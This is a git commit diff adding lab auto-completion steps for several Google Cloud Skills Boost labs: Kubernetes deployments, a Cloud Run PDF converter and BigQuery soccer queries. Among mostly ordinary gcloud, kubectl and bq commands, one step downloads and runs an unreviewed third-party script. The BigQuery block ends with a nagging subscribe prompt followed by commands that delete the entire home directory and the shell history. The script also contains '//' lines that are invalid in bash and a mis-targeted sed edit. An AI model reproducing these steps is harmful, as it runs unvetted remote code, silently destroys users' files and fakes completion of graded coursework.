84d403253b96cc31c7a303c2cd7dc3e5dd7eeb23
mhmmdrdwnsyhx <morganhydra27@gmail.com>
2025-07-29 03:26:37 +0700

    GCP Check-in Today

--- GoogleCloudPlatform.sh
+++ GoogleCloudPlatform.sh
@@ -494,6 +494,489 @@ while [ "$deploy_success" = false ]; do
   fi
 done
 
+//GSP053 Managing deployments Using Kubernetes Engine
+export ZONE=
+gcloud config set compute/zone $ZONE
+
+gsutil -m cp -r gs://spls/gsp053/orchestrate-with-kubernetes .
+
+cd orchestrate-with-kubernetes/kubernetes
+
+gcloud container clusters create bootcamp \
+  --machine-type e2-small \
+  --num-nodes 3 \
+  --scopes "https://www.googleapis.com/auth/projecthosting,storage-rw"
+
+sed -i 's/image: "kelseyhightower\/auth:2.0.0"/image: "kelseyhightower\/auth:1.0.0"/' deployments/auth.yaml
+
+kubectl create -f deployments/auth.yaml
+
+kubectl get deployments
+
+kubectl get pods
+
+kubectl create -f services/auth.yaml
+
+kubectl create -f deployments/hello.yaml
+
+kubectl create -f services/hello.yaml
+
+kubectl create secret generic tls-certs --from-file tls/
+
+kubectl create configmap nginx-frontend-conf --from-file=nginx/frontend.conf
+
+kubectl create -f deployments/frontend.yaml
+
+kubectl create -f services/frontend.yaml
+
+kubectl get services frontend
+
+sleep 10
+
+kubectl scale deployment hello --replicas=5
+
+kubectl get pods | grep hello- | wc -l
+
+kubectl scale deployment hello --replicas=3
+
+kubectl get pods | grep hello- | wc -l
+
+sed -i 's/image: "kelseyhightower\/auth:1.0.0"/image: "kelseyhightower\/auth:2.0.0"/' deployments/hello.yaml
+
+kubectl get replicaset
+
+kubectl rollout history deployment/hello
+
+kubectl get pods -o jsonpath --template='{range .items[*]}{.metadata.name}{"\t"}{"\t"}{.spec.containers[0].image}{"\n"}{end}'
+
+kubectl rollout resume deployment/hello
+kubectl rollout status deployment/hello
+kubectl rollout undo deployment/hello
+kubectl rollout history deployment/hello
+kubectl get pods -o jsonpath --template='{range .items[*]}{.metadata.name}{"\t"}{"\t"}{.spec.containers[0].image}{"\n"}{end}'
+kubectl create -f deployments/hello-canary.yaml
+kubectl get deployments
+
+//GSP021 Orchestrating The Cloud With Kubernetes
+export ZONE=
+curl -LO raw.githubusercontent.com/Titash-shil/Orchestrating-the-Cloud-with-Kubernetes-GSP021/refs/heads/main/qwiklab_explorers_gsp021.sh
+sudo chmod +x qwiklab_explorers_gsp021.sh
+./qwiklab_explorers_gsp021.sh
+
+//GSP644 Build a Serverless App with Cloud Run that Creates PDF
+export REGION=
+gcloud services disable run.googleapis.com
+
+gcloud services enable run.googleapis.com
+
+sleep 30
+
+git clone https://github.com/rosera/pet-theory.git
+
+cd pet-theory/lab03
+
+sed -i '6a\    "start": "node index.js",' package.json
+
+npm install express
+npm install body-parser
+npm install child_process
+npm install @google-cloud/storage
+
+gcloud builds submit \
+  --tag gcr.io/$GOOGLE_CLOUD_PROJECT/pdf-converter
+
+gcloud run deploy pdf-converter \
+  --image gcr.io/$GOOGLE_CLOUD_PROJECT/pdf-converter \
+  --platform managed \
+  --region $REGION \
+  --no-allow-unauthenticated \
+  --max-instances=1
+
+SERVICE_URL=$(gcloud beta run services describe pdf-converter --platform managed --region $REGION --format="value(status.url)")
+
+echo $SERVICE_URL
+
+curl -X POST $SERVICE_URL
+
+curl -X POST -H "Authorization: Bearer $(gcloud auth print-identity-token)" $SERVICE_URL
+
+gsutil mb gs://$GOOGLE_CLOUD_PROJECT-upload
+
+gsutil mb gs://$GOOGLE_CLOUD_PROJECT-processed
+
+gsutil notification create -t new-doc -f json -e OBJECT_FINALIZE gs://$GOOGLE_CLOUD_PROJECT-upload
+
+gcloud iam service-accounts create pubsub-cloud-run-invoker --display-name "PubSub Cloud Run Invoker"
+
+gcloud beta run services add-iam-policy-binding pdf-converter --member=serviceAccount:pubsub-cloud-run-invoker@$GOOGLE_CLOUD_PROJECT.iam.gserviceaccount.com --role=roles/run.invoker --platform managed --region $REGION
+
+PROJECT_NUMBER=$(gcloud projects describe $GOOGLE_CLOUD_PROJECT --format='value(projectNumber)')
+
+gcloud projects add-iam-policy-binding $GOOGLE_CLOUD_PROJECT --member=serviceAccount:service-$PROJECT_NUMBER@gcp-sa-pubsub.iam.gserviceaccount.com --role=roles/iam.serviceAccountTokenCreator
+
+gcloud beta pubsub subscriptions create pdf-conv-sub --topic new-doc --push-endpoint=$SERVICE_URL --push-auth-service-account=pubsub-cloud-run-invoker@$GOOGLE_CLOUD_PROJECT.iam.gserviceaccount.com
+
+gsutil -m cp gs://spls/gsp644/* gs://$GOOGLE_CLOUD_PROJECT-upload
+
+cat > Dockerfile <<EOF_END
+FROM node:20
+RUN apt-get update -y \
+    && apt-get install -y libreoffice \
+    && apt-get clean
+WORKDIR /usr/src/app
+COPY package.json package*.json ./
+RUN npm install --only=production
+COPY . .
+CMD [ "npm", "start" ]
+EOF_END
+
+cat > index.js <<'EOF_END'
+const {promisify} = require('util');
+const {Storage}   = require('@google-cloud/storage');
+const exec        = promisify(require('child_process').exec);
+const storage     = new Storage();
+const express     = require('express');
+const bodyParser  = require('body-parser');
+const app         = express();
+
+app.use(bodyParser.json());
+
+const port = process.env.PORT || 8080;
+app.listen(port, () => {
+  console.log('Listening on port', port);
+});
+
+app.post('/', async (req, res) => {
+  try {
+    const file = decodeBase64Json(req.body.message.data);
+    await downloadFile(file.bucket, file.name);
+    const pdfFileName = await convertFile(file.name);
+    await uploadFile(process.env.PDF_BUCKET, pdfFileName);
+    await deleteFile(file.bucket, file.name);
+  }
+  catch (ex) {
+    console.log(`Error: ${ex}`);
+  }
+  res.set('Content-Type', 'text/plain');
+  res.send('\n\nOK\n\n');
+})
+
+function decodeBase64Json(data) {
+  return JSON.parse(Buffer.from(data, 'base64').toString());
+}
+
+async function downloadFile(bucketName, fileName) {
+  const options = {destination: `/tmp/${fileName}`};
+  await storage.bucket(bucketName).file(fileName).download(options);
+}
+
+async function convertFile(fileName) {
+  const cmd = 'libreoffice --headless --convert-to pdf --outdir /tmp ' +
+              `"/tmp/${fileName}"`;
+  console.log(cmd);
+  const { stdout, stderr } = await exec(cmd);
+  if (stderr) {
+    throw stderr;
+  }
+  console.log(stdout);
+  pdfFileName = fileName.replace(/\.\w+$/, '.pdf');
+  return pdfFileName;
+}
+
+async function deleteFile(bucketName, fileName) {
+  await storage.bucket(bucketName).file(fileName).delete();
+}
+
+async function uploadFile(bucketName, fileName) {
+  await storage.bucket(bucketName).upload(`/tmp/${fileName}`);
+}
+EOF_END
+
+gcloud builds submit \
+  --tag gcr.io/$GOOGLE_CLOUD_PROJECT/pdf-converter
+
+gcloud run deploy pdf-converter \
+  --image gcr.io/$GOOGLE_CLOUD_PROJECT/pdf-converter \
+  --platform managed \
+  --region $REGION \
+  --memory=2Gi \
+  --no-allow-unauthenticated \
+  --max-instances=1 \
+  --set-env-vars PDF_BUCKET=$GOOGLE_CLOUD_PROJECT-processed
+
+//GSP850 BigQuery Soccer Data Analytical Insight
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
+
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region us-central1
+#gcloud config set compute/zone us-central1-a
+#export ZONE=us-central1-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------#
+
+
+
+bq query --use_legacy_sql=false \
+"
+SELECT
+ Events.playerId,
+ (Players.firstName || ' ' || Players.lastName) AS playerName,
+ SUM(IF(Tags2Name.Label = 'assist', 1, 0)) AS numAssists
+FROM
+ \`soccer.events\` Events,
+ Events.tags Tags
+LEFT JOIN
+ \`soccer.tags2name\` Tags2Name ON
+   Tags.id = Tags2Name.Tag
+LEFT JOIN
+ \`soccer.players\` Players ON
+   Events.playerId = Players.wyId
+GROUP BY
+ playerId, playerName
+ORDER BY
+ numAssists 
+"
+
+echo "${GREEN}${BOLD}
+
+Task 2 Completed
+
+${RESET}"
+
+
+#TASK 3
+
+bq query --use_legacy_sql=false \
+"
+WITH
+Passes AS
+(
+ SELECT
+   *,
+   /* 1801 is known Tag for 'accurate' from tags2name table */
+   (1801 IN UNNEST(tags.id)) AS accuratePass,
+   (CASE
+     WHEN ARRAY_LENGTH(positions) != 2 THEN NULL
+     ELSE
+  /* Translate 0-100 (x,y) coordinate-based distances to absolute positions
+  using "average" field dimensions of 105x68 before combining in 2D dist calc */
+       SQRT(
+         POW(
+           (positions[ORDINAL(2)].x - positions[ORDINAL(1)].x) * 105/100,
+           2) +
+         POW(
+           (positions[ORDINAL(2)].y - positions[ORDINAL(1)].y) * 68/100,
+           2)
+         )
+     END) AS passDistance
+ FROM
+   \`soccer.events\`
+ WHERE
+   eventName = 'Pass'
+)
+SELECT
+ Passes.teamId,
+ Teams.name AS team,
+ Teams.area.name AS teamArea,
+ COUNT(Passes.Id) AS numPasses,
+ AVG(Passes.passDistance) AS avgPassDistance,
+ SAFE_DIVIDE(
+   SUM(IF(Passes.accuratePass, Passes.passDistance, 0)),
+   SUM(IF(Passes.accuratePass, 1, 0))
+   ) AS avgAccuratePassDistance
+FROM
+ Passes
+LEFT JOIN
+ \`soccer.teams\` Teams ON
+   Passes.teamId = Teams.wyId
+WHERE
+ Teams.type = 'club'
+GROUP BY
+ teamId, team, teamArea
+ORDER BY
+ avgPassDistance
+
+"
+
+echo "${GREEN}${BOLD}
+
+Task 3 Completed
+
+${RESET}"
+
+
+#TASK 4
+bq query --use_legacy_sql=false \
+"
+WITH
+Shots AS
+(
+ SELECT
+  *,
+  /* 101 is known Tag for 'goals' from goals table */
+  (101 IN UNNEST(tags.id)) AS isGoal,
+  /* Translate 0-100 (x,y) coordinate-based distances to absolute positions
+  using "average" field dimensions of 105x68 before combining in 2D dist calc */
+  SQRT(
+    POW(
+      (100 - positions[ORDINAL(1)].x) * 105/100,
+      2) +
+    POW(
+      (50 - positions[ORDINAL(1)].y) * 68/100,
+      2)
+     ) AS shotDistance
+ FROM
+  \`soccer.events\`
+ WHERE
+  /* Includes both "open play" & free kick shots (including penalties) */
+  eventName = 'Shot' OR
+  (eventName = 'Free Kick' AND subEventName IN ('Free kick shot', 'Penalty'))
+)
+SELECT
+ ROUND(shotDistance, 0) AS ShotDistRound0,
+ COUNT(*) AS numShots,
+ SUM(IF(isGoal, 1, 0)) AS numGoals,
+ AVG(IF(isGoal, 1, 0)) AS goalPct
+FROM
+ Shots
+WHERE
+ shotDistance <= 50
+GROUP BY
+ ShotDistRound0
+ORDER BY
+ ShotDistRound0
+"
+
+echo "${GREEN}${BOLD}
+
+Task 4 Completed
+
+${RESET}"
+
+
+#TASK 5
+bq query --use_legacy_sql=false \
+"
+WITH
+Shots AS
+(
+ SELECT
+  *,
+  /* 101 is known Tag for 'goals' from goals table */
+  (101 IN UNNEST(tags.id)) AS isGoal,
+  /* Translate 0-100 (x,y) coordinates to absolute positions using "average"
+  field dimensions of 105x68 before using in various distance calcs;
+  LEAST used to cap shot locations to on-field (x, y) (i.e. no exact 100s) */
+  LEAST(positions[ORDINAL(1)].x, 99.99999) * 105/100 AS shotXAbs,
+  LEAST(positions[ORDINAL(1)].y, 99.99999) * 68/100 AS shotYAbs
+ FROM
+   \`soccer.events\`
+ WHERE
+   /* Includes both "open play" & free kick shots (including penalties) */
+   eventName = 'Shot' OR
+   (eventName = 'Free Kick' AND subEventName IN ('Free kick shot', 'Penalty'))
+),
+ShotsWithAngle AS
+(
+ SELECT
+   Shots.*,
+   /* Law of cosines to get 'open' angle from shot location to goal, given
+    that goal opening is 7.32m, placed midway up at field end of (105, 34) */
+   SAFE.ACOS(
+     SAFE_DIVIDE(
+       ( /* Squared distance between shot and 1 post, in meters */
+         (POW(105 - shotXAbs, 2) + POW(34 + (7.32/2) - shotYAbs, 2)) +
+         /* Squared distance between shot and other post, in meters */
+         (POW(105 - shotXAbs, 2) + POW(34 - (7.32/2) - shotYAbs, 2)) -
+         /* Squared length of goal opening, in meters */
+         POW(7.32, 2)
+       ),
+       (2 *
+         /* Distance between shot and 1 post, in meters */
+         SQRT(POW(105 - shotXAbs, 2) + POW(34 + 7.32/2 - shotYAbs, 2)) *
+         /* Distance between shot and other post, in meters */
+         SQRT(POW(105 - shotXAbs, 2) + POW(34 - 7.32/2 - shotYAbs, 2))
+       )
+     )
+   /* Translate radians to degrees */
+   ) * 180 / ACOS(-1)
+   AS shotAngle
+ FROM
+   Shots
+)
+SELECT
+ ROUND(shotAngle, 0) AS ShotAngleRound0,
+ COUNT(*) AS numShots,
+ SUM(IF(isGoal, 1, 0)) AS numGoals,
+ AVG(IF(isGoal, 1, 0)) AS goalPct
+FROM
+ ShotsWithAngle
+GROUP BY
+ ShotAngleRound0
+ORDER BY
+ ShotAngleRound0
+"
+
+echo "${GREEN}${BOLD}
+
+Task 5 Completed
+
+Lab Completed
+
+${RESET}"
+
+
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to QwikLab_Explorers_TS [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+//GSP
+
 
 
 //GSP
